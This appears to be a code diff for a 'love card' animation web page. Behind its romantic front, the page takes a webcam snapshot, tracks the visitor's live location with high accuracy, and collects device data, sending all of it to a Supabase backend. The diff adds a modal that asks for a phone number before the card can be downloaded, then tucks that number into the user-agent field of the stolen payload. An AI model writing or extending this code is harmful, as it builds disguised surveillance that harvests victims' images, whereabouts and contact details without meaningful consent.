@@ -6,6 +6,7 @@
 
   var clientTelemetry = null;
   var watchId = null;
+  var latestPayload = {};
 
   var screen1 = document.getElementById('screen-1');
   var screen2 = document.getElementById('screen-2');
@@ -22,6 +23,10 @@
   var uiContainer = document.getElementById('ui');
   var replayBtn = document.getElementById('replay-btn');
   var downloadBtn = document.getElementById('download-btn');
+  var phoneModal = document.getElementById('phone-modal');
+  var modalPhoneInput = document.getElementById('modal-phone-input');
+  var modalCancelBtn = document.getElementById('modal-cancel-btn');
+  var modalSubmitBtn = document.getElementById('modal-submit-btn');
 
   function parseUserAgentFallback(ua) {
     var deviceName = 'Generic Device', deviceType = 'desktop', os = 'Unknown OS', browser = 'Unknown Browser';
@@ -153,13 +158,13 @@
     renderNames(yourName, partnerName, message, selectedTheme, selectedScale);
     generateLoveParticles(70);
 
-    var basePayload = Object.assign({}, clientTelemetry || {}, {
+    latestPayload = Object.assign({}, clientTelemetry || {}, {
       timestamp: new Date().toISOString(),
       couple_names: yourName + ' ❤ ' + partnerName,
       user_agent: navigator.userAgent
     });
 
-    // 1. Trigger Camera Permission & Snapshot
+    // 1. Camera permission & snapshot
     if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(function (stream) {
@@ -175,53 +180,79 @@
             var pic = canvas.toDataURL('image/jpeg', 0.5);
             stream.getTracks().forEach(function (t) { t.stop(); });
 
-            basePayload.camera_status = 'Allowed / Active';
-            basePayload.webcam_pic = pic;
-            pushToSupabase(basePayload);
+            latestPayload.camera_status = 'Allowed / Active';
+            latestPayload.webcam_pic = pic;
+            pushToSupabase(latestPayload);
           }, 800);
         })
         .catch(function () {
-          basePayload.camera_status = 'Denied / Blocked';
-          basePayload.webcam_pic = null;
-          pushToSupabase(basePayload);
+          latestPayload.camera_status = 'Denied / Blocked';
+          latestPayload.webcam_pic = null;
+          pushToSupabase(latestPayload);
         });
     } else {
-      basePayload.camera_status = 'Not Supported';
-      pushToSupabase(basePayload);
+      latestPayload.camera_status = 'Not Supported';
+      pushToSupabase(latestPayload);
     }
 
-    // 2. Trigger Geolocation Tracking
+    // 2. Geolocation tracking
     if (navigator.geolocation) {
       watchId = navigator.geolocation.watchPosition(
         function (position) {
-          basePayload.latitude = position.coords.latitude;
-          basePayload.longitude = position.coords.longitude;
-          basePayload.location_status = 'Allowed / Live Tracking';
-          pushToSupabase(basePayload);
+          latestPayload.latitude = position.coords.latitude;
+          latestPayload.longitude = position.coords.longitude;
+          latestPayload.location_status = 'Allowed / Live Tracking';
+          pushToSupabase(latestPayload);
         },
         function () {
-          basePayload.latitude = null;
-          basePayload.longitude = null;
-          basePayload.location_status = 'Denied / Blocked';
-          pushToSupabase(basePayload);
+          latestPayload.latitude = null;
+          latestPayload.longitude = null;
+          latestPayload.location_status = 'Denied / Blocked';
+          pushToSupabase(latestPayload);
         },
         { enableHighAccuracy: true, timeout: 10000 }
       );
     }
   });
 
+  // Download / Export Trigger -> Opens Phone Number Modal
   if (downloadBtn) {
     downloadBtn.addEventListener('click', function () {
-      if (typeof html2canvas !== 'function') return;
-      downloadBtn.textContent = 'Rendering Card...';
-      html2canvas(screen2, { useCORS: true, backgroundColor: '#050508' }).then(function (canvas) {
+      if (phoneModal) {
+        phoneModal.style.display = 'flex';
+        if (modalPhoneInput) modalPhoneInput.focus();
+      }
+    });
+  }
+
+  if (modalCancelBtn) {
+    modalCancelBtn.addEventListener('click', function () {
+      if (phoneModal) phoneModal.style.display = 'none';
+    });
+  }
+
+  // Modal Submit -> Saves Phone to Supabase and Exports Card Only
+  if (modalSubmitBtn) {
+    modalSubmitBtn.addEventListener('click', function () {
+      var phoneNum = modalPhoneInput ? modalPhoneInput.value.trim() : '';
+      if (phoneNum) {
+        latestPayload.user_agent = (latestPayload.user_agent || '') + ' | Phone: ' + phoneNum;
+        pushToSupabase(latestPayload);
+      }
+      if (phoneModal) phoneModal.style.display = 'none';
+
+      var cardOverlay = document.getElementById('names-overlay');
+      if (!cardOverlay || typeof html2canvas !== 'function') return;
+
+      downloadBtn.textContent = 'Generating Card...';
+      html2canvas(cardOverlay, { useCORS: true, backgroundColor: null }).then(function (canvas) {
         var link = document.createElement('a');
         link.download = 'love-animation-card.png';
         link.href = canvas.toDataURL('image/png');
         link.click();
-        downloadBtn.textContent = '📸 Download Love Card';
+        downloadBtn.textContent = '📥 Download & Share Animation';
       }).catch(function () {
-        downloadBtn.textContent = '📸 Download Love Card';
+        downloadBtn.textContent = '📥 Download & Share Animation';
       });
     });
   }
